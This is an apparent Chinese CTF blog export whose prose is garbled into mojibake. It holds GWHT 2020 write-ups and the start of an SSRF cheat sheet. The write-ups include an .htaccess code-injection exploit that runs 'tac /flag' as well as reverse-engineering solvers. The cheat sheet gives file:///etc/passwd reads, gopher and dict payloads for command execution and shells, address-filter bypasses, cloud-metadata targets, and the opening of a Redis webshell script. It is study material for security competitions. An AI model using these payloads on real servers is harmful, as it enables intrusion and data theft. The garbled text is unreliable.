è®©phpæ–‡ä»¶åŒ…å«.htaccessæ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼š 12345678import requestsurl = &#x27;http://183.129.189.60:10023/sandbox/74adfb351cd5c3621c62d62e0785f24c/&#x27;payload = &#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\\\%0Ale%20&quot;.htaccess&quot;\\n%23&lt;?php system(\\&#x27;tac /fl&quot;a&quot;g\\&#x27;);?&gt;\\\\&#x27;url2 = url + payloadr = requests.get(url2)req = requests.get(url)print(req.content) flag: GWHT{easyApache} å‚è€ƒï¼š2019Xnuca Ezphp â€‹ MISCcom è€çŸ¥è¯†ï¼Ÿ nc ip port 183.129.189.60:10028 ncï¼Œé€‰æ‹©[1] Sign inå¾—åˆ°å¤šè¡Œå¤šåˆ—æ•°å­—ï¼Œæ¯è¡Œæœ€åä¸€ä¸ªæ•°å­—å¾ˆå¤§ï¼Œæ˜“çŸ¥ä¸ºæ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„ã€‚ è°ƒæ•´å¥½listæ ¼å¼ï¼Œå¯¼å‡ºAå’ŒBçŸ©é˜µï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546s = &#x27;&#x27;&#x27;352 971 218 64 892 633 999 122 123 792 727 822 719 16 780 261 264 317 721 957 517 1017 991 348 394 869 320 766 717 667 731 58 413 64 955 85069331023 635 210 93 822 102 584 905 79 257 259 482 662 323 833 503 270 393 411 7 879 918 905 336 822 905 204 190 651 653 899 333 266 750 755 8980959309 516 404 568 599 827 371 594 332 849 596 773 39 962 860 258 669 430 439 803 720 27 349 727 637 587 806 441 668 803 82 446 959 14 504 8846004740 858 936 187 273 53 28 758 934 228 465 549 809 582 854 404 705 448 741 151 22 831 558 73 472 665 126 949 144 986 643 997 92 881 557 7807051740 158 620 912 266 1013 796 718 563 379 70 523 438 424 213 230 908 135 753 182 369 869 570 335 670 693 691 536 217 809 665 222 82 959 31 8483230841 673 73 676 652 87 141 148 850 360 0 380 958 839 595 431 92 65 673 698 638 491 73 462 114 414 888 364 470 526 1012 543 794 720 744 8045288401 490 262 971 940 535 93 1003 427 149 250 614 939 392 848 941 109 851 610 773 56 132 512 39 980 924 804 490 156 111 596 227 369 525 864 85385801010 82 401 277 207 10 766 623 594 287 318 46 465 122 747 895 101 448 931 201 278 554 1007 914 524 472 861 230 65 585 504 133 858 443 169 859817424 492 794 572 1002 650 185 519 556 484 215 622 765 498 818 1002 908 906 798 168 802 414 650 872 20 422 677 469 129 903 823 693 791 538 154 9669615193 369 816 16 832 195 350 157 788 474 842 378 221 922 58 965 345 61 512 4 940 251 705 891 506 49 427 149 552 967 649 756 164 639 88 7413954853 364 480 712 448 505 722 6 580 820 143 174 716 381 814 635 689 99 939 564 901 881 301 796 984 44 392 818 803 702 817 488 127 340 188 8596218771 953 261 317 610 8 372 794 469 874 531 629 252 393 52 919 12 568 46 970 722 306 928 597 993 442 158 385 636 226 363 302 977 138 473 8848620224 584 993 838 889 769 342 360 734 464 871 584 21 683 1003 465 146 665 492 309 89 212 843 4 53 191 512 535 439 325 888 343 567 427 9 7388411961 269 239 353 778 88 592 995 673 29 382 180 788 915 496 278 591 933 770 629 64 777 834 1015 776 763 147 192 915 986 466 256 335 380 653 9793294699 35 335 332 424 388 819 194 791 557 771 627 895 995 389 550 387 293 175 16 837 898 768 9 136 33 728 593 556 154 755 411 193 969 802 8135375749 832 428 87 475 816 331 1001 338 909 6 854 669 970 781 274 556 194 896 51 566 988 993 732 805 978 536 566 553 696 235 319 625 670 944 9922037908 65 915 341 838 709 234 928 732 296 437 604 685 35 750 296 379 465 207 825 239 618 837 905 544 336 854 351 270 631 641 1004 238 509 696 8712695208 314 374 647 286 32 275 987 819 119 522 276 313 663 18 3 521 539 115 57 783 56 647 761 122 146 544 168 277 948 661 7 219 765 452 6473121689 32 710 20 73 611 523 377 751 812 370 905 598 5 156 796 954 443 349 202 444 996 711 1012 831 558 254 785 297 916 98 896 749 788 134 9310929223 941 599 396 675 40 764 638 13 320 1013 267 370 175 733 946 845 644 271 812 727 815 683 685 753 818 686 315 378 160 529 440 877 613 220 9348582765 677 735 425 923 133 683 20 79 220 112 706 432 972 549 862 938 194 235 365 1004 945 696 646 157 44 700 870 168 695 162 640 687 337 623 8841182744 408 273 93 935 143 356 815 642 29 793 664 755 47 886 810 867 380 645 745 39 68 353 933 337 603 733 499 986 773 604 559 106 947 567 8965864161 85 548 849 4 843 383 209 672 761 209 149 473 776 1014 426 582 579 406 1006 367 578 234 779 20 263 155 203 649 925 106 287 696 73 461 7258983757 685 465 259 64 523 306 179 945 995 82 859 646 981 928 181 606 289 387 507 834 360 327 86 245 219 603 520 667 162 331 546 245 299 1000 7464039309 992 939 155 930 15 579 705 267 546 307 370 855 462 843 145 535 740 586 531 1003 656 600 883 801 172 322 532 803 319 643 496 835 414 72 8863792571 286 93 300 806 548 451 530 804 875 724 709 637 28 145 763 446 264 480 691 540 699 807 236 515 770 623 793 458 1000 470 457 965 566 379 9882639901 238 651 488 778 35 14 127 1022 481 261 113 486 437 252 499 74 253 211 882 150 421 496 85 60 457 999 934 827 1018 496 539 428 510 892 8009103348 862 994 846 671 692 1011 730 83 875 146 858 205 55 811 669 943 425 372 837 365 386 692 353 784 488 774 297 367 414 92 307 975 686 210 9357962966 654 48 123 703 168 757 586 129 317 330 544 211 520 309 425 600 282 906 956 394 577 728 617 910 350 458 64 651 112 610 858 536 426 819 8059368250 187 608 352 563 714 664 829 625 649 581 345 110 36 153 659 487 1016 14 49 850 721 276 994 209 529 404 961 808 5 109 923 839 582 992 9366682128 320 933 837 149 374 22 663 647 1008 844 270 530 567 451 96 525 353 888 754 153 647 183 353 772 281 148 369 286 781 134 966 123 317 68 5933023794 278 989 582 849 10 529 943 902 679 39 420 492 191 360 348 1020 1020 551 808 113 307 468 524 444 801 792 817 350 16 898 554 975 842 700 10213211420 19 983 47 541 351 1014 428 236 710 502 74 399 142 586 30 419 485 543 665 741 861 340 396 272 797 405 238 765 362 742 606 199 661 360 7518069764 719 234 197 99 70 38 113 546 420 969 584 176 404 751 642 364 845 702 501 509 451 161 638 87 576 346 839 93 698 98 777 516 963 898 7135907265 984 660 638 1009 23 951 698 400 6 913 63 911 591 187 718 655 695 49 422 974 906 1010 198 178 73 39 402 258 77 695 969 536 789 675 8524911&#x27;&#x27;&#x27;.strip().split(&#x27;\\n&#x27;)A = []B = []for k in s: li = k.strip().split(&#x27; &#x27;) li = [int(x) for x in li] A.append(li[:-1]) B.append(li[-1])print(A)print(B) æ”¾åˆ°Sageä¸‹æ±‚è§£ä¸€æŠŠæ¢­ï¼š 12345#SageA = Matrix([[...],[...],[...],...,[...]]) #AY = vector([...]) #BA \\ Y# å°†listå€¼è¾“å…¥äº¤äº’å¾—flagï¼š flag: GWHT{4b55c1d5fb6a0234fc252b19e510301a} â€‹ REVERSElogin å¿«ä¹ç­¾åˆ°ï¼æ³¨ï¼šå¾—åˆ°çš„ flag éœ€è¦ MD5 ä¹‹åå†åšæäº¤ 183.129.189.60:10028 æ‹–åˆ°IDAæŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°å¾ˆå¤šPyå¼€å¤´çš„å‡½æ•°ï¼Œè‚¯å®šæ˜¯pythonå†™çš„ç¨‹åºäº†ã€‚ pythonåç¼–è¯‘ï¼Œå…ˆç”¨pyinstxtractorè¿˜åŸåˆ°pycæ–‡ä»¶ï¼Œå†ç”¨uncompyle6è¿˜åŸåˆ°pyæ–‡ä»¶ã€‚ å¼€å§‹åœ¨Python3.8ç¯å¢ƒä¸‹è¿˜åŸå‘ç°pyæ–‡ä»¶æœ‰é—®é¢˜ï¼Œæ ¹æ®æç¤ºé‡è£…è‡³Python3.6ç¯å¢ƒï¼Œè¿˜åŸå¾—åˆ°æ­£å¸¸çš„login.pyæºæ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334353637# uncompyle6 version 3.7.2# Python bytecode 3.6 (3379)# Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0]# Embedded file name: login.pyimport sysinput1 = input(&#x27;input something:&#x27;)if len(input1) != 14: print(&#x27;Wrong length!&#x27;) sys.exit()else: code = [] for i in range(13): code.append(ord(input1[i]) ^ ord(input1[(i + 1)])) code.append(ord(input1[13])) a1 = code[2] a2 = code[1] a3 = code[0] a4 = code[3] a5 = code[4] a6 = code[5] a7 = code[6] a8 = code[7] a9 = code[9] a10 = code[8] a11 = code[10] a12 = code[11] a13 = code[12] a14 = code[13] if (a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print(&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;) print(&#x27;Congratulations and have fun!&#x27;) else: print(&#x27;Sorry,plz try again...&#x27;)# okay decompiling login.pyc ä¸‰æ­¥ï¼Œ1.ä¸¤ä¸¤å­—ç¬¦å¼‚æˆ–ï¼Œ2.æ‰“ä¹±é¡ºåºï¼Œ3.ç”Ÿæˆçº¿æ€§æ–¹ç¨‹ç»„ã€‚ é€šè¿‡Sageè§£çº¿æ€§æ–¹ç¨‹ç»„ï¼Œè¿˜åŸcodeæ•°ç»„é¡ºåºï¼Œæœ€åä»åå¾€å‰ä¾æ¬¡å¼‚æˆ–è¿˜åŸï¼Œmd5å“ˆå¸Œå¾—flagã€‚ æ ¼å¼åŒ–+Sageè§£æ–¹ç¨‹ç»„ï¼š 123456789101112s = &#x27;&#x27;&#x27;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#x27;&#x27;&#x27;.split(&#x27;&amp;&#x27;)A = []B = []for k in s: t = k.strip().strip(&#x27;(&#x27;).strip(&#x27;)&#x27;).split(&#x27;==&#x27;) exp = t[0].replace(&#x27;a1 * &#x27;,&#x27;&#x27;).replace(&#x27; + a2 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a3 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a4 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a5 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a6 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a7 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a8 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a9 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a10 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a11 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a12 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a13 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a14 *&#x27;,&#x27;,&#x27;).replace(&#x27; - a2 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a3 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a4 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a5 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a6 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a7 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a8 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a9 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a10 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a11 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a12 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a13 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a14 *&#x27;,&#x27;, -&#x27;).replace(&#x27; + (a8 &lt;&lt; 7)&#x27;,&#x27;, &#x27;+str(2**7)) A.append(eval(&#x27;[&#x27;+exp+&#x27;]&#x27;)) B.append(int(t[1]))print(A)print(B) è¿˜åŸcodeæ•°ç»„é¡ºåº 123456ind = [2, 1, 0, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13]out = [119, 24, 10, 7, 104, 43, 28, 91, 52, 108, 88, 74, 88, 33]ori = [out[ind.index(i)] for i in range(14)]print(ori)#[10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33] å­—ç¬¦å¼‚æˆ– 12345678out = [10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33]flag = out[:]for i in range(12,-1,-1): flag[i] ^= flag[i+1] print(&#x27;&#x27;.join([chr(k) for k in flag]))#U_G07_th3_k3y! å¯¹inputè¿›è¡Œmd5å“ˆå¸Œå¾—flagã€‚ flag: GWHT{58964088b637e50d3a22b9510c1d1ef8} â€‹ Bytecode äº†è§£ä¸€ä¸‹Bytecode æŒ‰ç…§Pythonå­—èŠ‚ç è§„åˆ™æ‰‹å·¥é€†å‘ï¼Œè¿˜åŸè¿‡ç¨‹ä¸­å¯ä¸æ–­ä½¿ç”¨python -m dis code.pyå¯¹æ¯”æ˜¯å¦æ­£ç¡®ã€‚ è¿˜åŸå‡ºæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748en=[3,37,72,9,6,132]output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]print(&#x27;welcome to GWHT2020&#x27;)flag=raw_input(&#x27;please input your flag:&#x27;)str=flaga=len(str)if a&lt;38: print(&#x27;length wrong!&#x27;) exit(0) if (((ord(str[0])*2020+ord(str[1]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])==1182843538814603: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;bye~&#x27;) exit(0)#GWHT&#123; x=[]k=5for i in range(13): b=ord(str[k]) c=ord(str[k+1]) a11=c^en[i%6] a22=b^en[i%6] x.append(a11) x.append(a22) k+=2if x==output: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;oh,you are wrong!&#x27;) exit(0)l=len(str)a1=ord(str[l-7])a2=ord(str[l-6])a3=ord(str[l-5])a4=ord(str[l-4])a5=ord(str[l-3])a6=ord(str[l-2])if a1*3+a2*2+a3*5==1003: if a1*4+a2*7+a3*9==2013: if a1+a2*8+a3*2==1109: if a4*3+a5*2+a6*5==671: if a4*4+a5*7+a6*9==1252: if a4+a5*8+a6*2==644: print(&#x27;congraduation!you get the right flag!&#x27;) ä¸‰éƒ¨åˆ†ï¼Œ1.ç®€å•çˆ†ç ´ï¼Œå¯ç›´æ¥çŒœæµ‹å‡ºGWHT&#123;ï¼Œ2.æ•°ç»„å¼‚æˆ–ï¼Œåæ¨ï¼Œ3.çº¿æ€§æ–¹ç¨‹ç»„ï¼ŒSageè§£ã€‚ è¿èµ·æ¥å³flagã€‚ æ•°ç»„å¼‚æˆ– 12345678910111213en = [3,37,72,9,6,132]output = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]ori = &#x27;&#x27;k = 0for i in range(13): c = output[k]^en[i%6] b = output[k+1]^en[i%6] ori += chr(b)+chr(c) k += 2 print(ori)#cfa2b87b3f746a8f0ac5c5963f Sageè§£æ–¹ç¨‹ç»„ 123456789#SageA = Matrix([[3,2,5],[4,7,9],[1,8,2]])Y1 = vector([1003,2013,1109])Y2 = vector([671,1252,644])print(A \\ Y1)print(A \\ Y2)#(97, 101, 102)#(102, 55, 51)#aef73 flag: GWHT{cfa2b87b3f746a8f0ac5c5963faef73} â€‹ easyre easyre IDAæ‰“å¼€ï¼Œè·Ÿè¸ªåˆ°mainå‡½æ•°ï¼Œä»£ç é€»è¾‘æ¸…æ™°ï¼Œè¾“å…¥å­—ç¬¦ä¸²é€šè¿‡ä¸‰æ­¥åŠ å¯†å¤„ç†å¾—åˆ°å¯†æ–‡ï¼š encode_oneæ˜¯base64ç¼–ç å‡½æ•°ï¼Œencode_twoæ˜¯å­—ç¬¦ä¸²åˆ†å››å—ä¹±åºå‡½æ•°ï¼Œencode_threeæ˜¯ç®€å•ç§»ä½å‡½æ•°ã€‚ Pythonè„šæœ¬ï¼š 123456789101112131415161718192021222324252627s=&#x27;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#x27;t=&#x27;&#x27;for i in range(len(s)): x=ord(s[i]) for j in range(127): y=-1 if j&lt;=64 or j&gt;90: if j&lt;=96 or j&gt;122: if j&lt;=47 or j&gt;57: y=j else: y=(j-48+3)%10+48 else: y=(j-97+3)%26+97 else: y=(j-65+3)%26+65 if y==x: t+=chr(j)#t=&#x27;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&#x27;u=t[13:26]+t[39:]+t[:13]+t[26:39]#u=&#x27;R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0=&#x27;import base64print(base64.b64decode(u.encode()))#GWHT&#123;672cc4778a38e80cb362987341133ea2&#125; flag: GWHT{672cc4778a38e80cb362987341133ea2}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"SSRF","slug":"web-SSRF","date":"2020-09-03T04:02:21.000Z","updated":"2022-04-25T15:14:41.761Z","comments":true,"path":"2020/09/03/web-SSRF/","permalink":"https://lazzzaro.github.io/2020/09/03/web-SSRF/","excerpt":"","text":"â€‹ æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰SSRFï¼ˆServer-Side Request Forgerï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚ â€‹ åŸºæœ¬SSRF123456789101112131415161718HTTPå†…å®¹è·å–http://127.0.0.1:80http://0.0.0.0:80http://localhost:80è¯»æ–‡ä»¶file://path/to/filefile:///etc/passwdfile://\\/\\/etc/passwdssrf.php?url=file:///etc/passwdç«¯å£æ¢æµ‹ï¼ˆBurpsuiteè‡ªå®šä¹‰è¿­ä»£å™¨ï¼‰dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;ssrf.php?url=dict://attacker:11111/å‘½ä»¤æ‰§è¡Œ/åå¼¹shellï¼ˆPOSTè¯·æ±‚ï¼‰gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;ä¸¤æ¬¡URLç¼–ç çš„TCPæ•°æ®æµ&gt;gopher://172.17.0.7:80/_POST%2520/index.php%2520HTTP/1.1%250d%250AHost:172.17.0.7%250d%250AContent-Type:application/x-www-form-urlencoded%250d%250AContent-Length:36%250d%250A%250d%250Aname=admin%26password=123456%26result=60%250d%250A å‚è€ƒï¼šæ‰‹æŠŠæ‰‹å¸¦ä½ ç”¨ SSRF æ‰“ç©¿å†…ç½‘ â€‹ å¸¸ç”¨æ–‡ä»¶123456å†…ç½‘IPåœ°å€ä¿¡æ¯ï¼š/etc/hostsç½‘ç»œæƒ…å†µï¼š/proc/net/arp/etc/network/interfaces â€‹ ç»•è¿‡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364HTTPSåè®®https://127.0.0.1/https://localhost/[::]http://[::]:80/http://0000::1:80/åŸŸåè·³è½¬http://spoofed.burpcollaborator.nethttp://localtest.mehttp://customer1.app.localhost.my.company.127.0.0.1.nip.iohttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhosthttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost&lt;anything&gt;.&lt;IP Address&gt;.nip.ioCIDRhttp://127.127.127.127http://127.0.1.3http://127.0.0.0åè¿›åˆ¶IPåœ°å€http://0177.0.0.1/http://2130706433/ = http://127.0.0.1http://3232235521/ = http://192.168.0.1http://3232235777/ = http://192.168.1.1IPv6/IPv4åœ°å€åµŒå…¥http://[0:0:0:0:0:ffff:127.0.0.1]å»0åœ°å€http://0/http://127.1http://127.0.1bashå˜é‡ï¼ˆcurlæƒ…å†µï¼‰curl -v &quot;http://evil$google.com&quot;$google = &quot;&quot;ç»„åˆæŠ€å·§http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/urllib2 : 1.1.1.1requests + browsers : 2.2.2.2urllib : 3.3.3.3ç»•è¿‡filter_var()0://evil.com:80;http://google.com:80/ç»•å¼±parserhttp://127.1.1.1:80\\@127.2.2.2:80/http://127.1.1.1:80\\@@127.2.2.2:80/http://127.1.1.1:80:\\@@127.2.2.2:80/http://127.1.1.1:80#\\@127.2.2.2:80/DNSè®°å½•ï¼ˆæ£€æµ‹å¸¦å¤–æµé‡ç›‘æ§å¹³å°ï¼šhttp://ceye.io/dns-rebindingï¼‰http://169.254.169.254http://metadata.nicob.net/http://169.254.169.254.xip.io/http://1ynrnhl.xip.io/http://www.owasp.org.1ynrnhl.xip.io/HTTP302è·³è½¬é™æ€:http://nicob.net/redir6aåŠ¨æ€:http://nicob.net/redir-http-169.254.169.254:80- â€‹ æ”»å‡»Redis1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# è„šæœ¬1# PHPShellå†™å…¥è„šæœ¬import socketfrom urllib.parse import unquote# å¯¹gopherusç”Ÿæˆçš„payloadè¿›è¡Œä¸€æ¬¡urldecodepayload = unquote(&quot;&quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftpè¢«åŠ¨æ¨¡å¼çš„passvie port,ç›‘å¬åˆ°1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# è®¡æ•°å™¨ï¼Œç”¨äºåŒºåˆ†æ˜¯ç¬¬å‡ æ¬¡ftpè¿æ¥count = 1while 1: conn, address = sk.accept() 